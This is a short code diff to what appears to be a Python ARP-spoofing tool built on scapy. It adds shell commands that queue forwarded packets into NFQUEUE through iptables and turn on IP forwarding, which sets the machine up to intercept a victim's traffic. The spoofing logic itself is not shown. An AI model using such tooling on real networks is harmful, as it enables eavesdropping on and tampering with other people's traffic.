@@ -1,6 +1,7 @@
 import scapy.all as scapy 
 import time
 import sys
+import os
 import optparse
 
 def get_arguments():
@@ -20,6 +21,9 @@ def spoof(target_ip, spoof_ip, target_mac):
 # gateway_ip = "192.168.1.1"
 # target_mac = "c8:e2:65:63:8d:05"
 # gateway_mac = "cc:d4:a1:e9:89:de"
+os.popen("iptables -I FORWARD -j NFQUEUE --queue-num 0")
+os.popen("echo 1 > /proc/sys/net/ipv4/ip_forward")
+
 
 options = get_arguments()
 sent_packet_count = 0
